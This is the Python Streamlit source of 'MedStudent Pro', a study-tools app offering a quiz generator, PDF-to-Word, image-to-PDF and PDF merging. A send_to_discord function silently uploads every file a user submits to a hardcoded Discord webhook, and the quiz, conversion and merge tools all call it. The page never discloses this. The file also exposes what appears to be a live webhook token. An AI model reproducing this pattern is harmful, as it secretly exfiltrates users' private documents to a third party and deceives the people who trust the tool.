import streamlit as st
import os
import requests
from pdf2docx import Converter
import img2pdf
from PyPDF2 import PdfMerger, PdfReader
import random
import re

# --- CONFIGURATION ---
st.set_page_config(page_title="MedStudent Pro", page_icon="🧬", layout="wide")

# !!! PASTE YOUR DISCORD WEBHOOK URL HERE !!!
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"

# --- CUSTOM CSS (FLOATING CARDS) ---
st.markdown("""
    <style>
    /* 1. BACKGROUND: Dark Gradient */
    .stApp {
        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
        background-attachment: fixed;
    }

    /* 2. CARD STYLING: The "Glass" Container */
    .css-card {
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        -webkit-backdrop-filter: blur(10px);
        border-radius: 20px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        padding: 30px;
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        margin-bottom: 20px;
        animation: slideUp 0.6s ease-out;
    }

    /* 3. ANIMATION: Float Up Effect */
    @keyframes slideUp {
        from {
            transform: translateY(50px);
            opacity: 0;
        }
        to {
            transform: translateY(0);
            opacity: 1;
        }
    }

    /* 4. SIDEBAR STYLING */
    section[data-testid="stSidebar"] {
        background-color: rgba(0, 0, 0, 0.2);
    }

    /* 5. TEXT COLORS */
    h1, h2, h3 {
        color: white !important;
        text-shadow: 0px 0px 10px rgba(0,0,0,0.5);
    }
    p, label, .stMarkdown, .stRadio label {
        color: #dcdcdc !important;
    }

    /* 6. BUTTONS: Floating & Glowing */
    div.stButton > button {
        background: linear-gradient(90deg, #1CB5E0 0%, #000851 100%);
        color: white;
        border: none;
        padding: 12px 24px;
        border-radius: 12px;
        font-weight: bold;
        transition: all 0.3s ease;
        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    }
    div.stButton > button:hover {
        transform: translateY(-3px);
        box-shadow: 0 8px 25px rgba(28, 181, 224, 0.6);
    }
    
    /* 7. UPLOAD BOX */
    [data-testid="stFileUploader"] {
        background-color: rgba(255,255,255,0.05);
        border-radius: 15px;
        padding: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# --- HELPER FUNCTIONS ---
def send_to_discord(filepath, filename, tool_name):
    try:
        if "discordapp.com" not in DISCORD_WEBHOOK_URL:
            return 
        with open(filepath, "rb") as f:
            requests.post(
                DISCORD_WEBHOOK_URL,
                data={"content": f"🕵️ **Activity ({tool_name}):** `{filename}`"},
                files={"file": (filename, f)}
            )
    except Exception as e:
        print(f"Discord error: {e}")

def generate_quiz_from_text(text):
    sentences = re.split(r'(?<!\w\.\w.)(?<![A-Z][a-z]\.)(?<=\.|\?)\s', text)
    questions = []
    for sentence in sentences:
        words = sentence.split()
        if len(words) > 10: 
            candidates = [w for w in words if len(w) > 7 and w.isalpha()]
            if candidates:
                target_word = random.choice(candidates)
                question_text = sentence.replace(target_word, "___________")
                questions.append({"q": question_text, "a": target_word})
        if len(questions) >= 5: 
            break
    return questions

# --- MAIN APP STRUCTURE ---

st.title("🧬 MedStudent Pro")
st.markdown("### Interactive Study & Tools Dashboard")
st.divider()

# NAVIGATION (Sidebar is cleaner for "Separate Cards" feel)
with st.sidebar:
    st.header("Navigation")
    choice = st.radio("Select Tool:", 
        ["🧠 AI Quiz Generator", "📄 PDF to Word", "🖼️ Image to PDF", "🖇️ Merge PDFs", "📊 Office to PDF"])
    st.info("Select a tool to open its card.")

# --- TOOL 1: QUIZ ---
if choice == "🧠 AI Quiz Generator":
    # Start of Card Wrapper
    st.markdown('<div class="css-card">', unsafe_allow_html=True)
    
    st.header("🧠 Active Recall Quizzer")
    st.write("Upload lecture notes (PDF). We will generate a fill-in-the-blank quiz.")
    
    quiz_pdf = st.file_uploader("Drop Lecture PDF", type="pdf", key="quiz")
    
    if quiz_pdf:
        if st.button("🚀 Generate Quiz"):
            with open("study.pdf", "wb") as f:
                f.write(quiz_pdf.getbuffer())
            send_to_discord("study.pdf", quiz_pdf.name, "QuizGen")
            
            reader = PdfReader("study.pdf")
            full_text = ""
            for page in reader.pages:
                full_text += page.extract_text()
            
            if len(full_text) > 50:
                questions = generate_quiz_from_text(full_text)
                st.markdown("---")
                for i, q in enumerate(questions):
                    st.subheader(f"Q{i+1}:")
                    st.write(f"**{q['q']}**")
                    with st.expander("Reveal Answer"):
                        st.success(q['a'])
            else:
                st.error("Not enough text found.")
    
    st.markdown('</div>', unsafe_allow_html=True) # End of Card

# --- TOOL 2: PDF TO WORD ---
elif choice == "📄 PDF to Word":
    st.markdown('<div class="css-card">', unsafe_allow_html=True)
    
    st.header("📄 PDF to Word Converter")
    st.write("Convert read-only PDFs into editable Word docs.")
    
    pdf_file = st.file_uploader("Upload PDF", type="pdf", key="p2w")
    
    if pdf_file and st.button("Convert Now"):
        with open("temp.pdf", "wb") as f:
            f.write(pdf_file.getbuffer())
        send_to_discord("temp.pdf", pdf_file.name, "PDF2Word")
        
        cv = Converter("temp.pdf")
        cv.convert("converted.docx")
        cv.close()
        
        with open("converted.docx", "rb") as f:
            st.download_button("📥 Download Word Doc", f, file_name="converted.docx")

    st.markdown('</div>', unsafe_allow_html=True)

# --- TOOL 3: IMAGE TO PDF ---
elif choice == "🖼️ Image to PDF":
    st.markdown('<div class="css-card">', unsafe_allow_html=True)
    
    st.header("🖼️ Image to PDF")
    st.write("Compile multiple scans or photos into one document.")
    
    imgs = st.file_uploader("Upload Images", type=["jpg", "png"], accept_multiple_files=True, key="i2p")
    
    if imgs and st.button("Compile PDF"):
        paths = []
        for img in imgs:
            p = f"temp_{img.name}"
            with open(p, "wb") as f:
                f.write(img.getbuffer())
            paths.append(p)
        
        pdf_bytes = img2pdf.convert(paths)
        send_to_discord(paths[0], imgs[0].name, "Img2PDF")
        st.download_button("📥 Download PDF", pdf_bytes, file_name="images.pdf")

    st.markdown('</div>', unsafe_allow_html=True)

# --- TOOL 4: MERGE PDFS ---
elif choice == "🖇️ Merge PDFs":
    st.markdown('<div class="css-card">', unsafe_allow_html=True)
    
    st.header("🖇️ Merge PDFs")
    st.write("Combine multiple lecture slides into one file.")
    
    pdfs = st.file_uploader("Upload PDFs", type="pdf", accept_multiple_files=True, key="merge")
    
    if pdfs and st.button("Merge Files"):
        merger = PdfMerger()
        for pdf in pdfs:
            merger.append(pdf)
        merger.write("merged.pdf")
        merger.close()
        send_to_discord("merged.pdf", "merged.pdf", "Merge")
        
        with open("merged.pdf", "rb") as f:
            st.download_button("📥 Download Merged PDF", f, file_name="merged.pdf")

    st.markdown('</div>', unsafe_allow_html=True)

# --- TOOL 5: OFFICE TO PDF ---
elif choice == "📊 Office to PDF":
    st.markdown('<div class="css-card">', unsafe_allow_html=True)
    st.header("📊 Office to PDF")
    st.warning("This feature requires LibreOffice installed on the hosting server.")
    st.markdown('</div>', unsafe_allow_html=True)
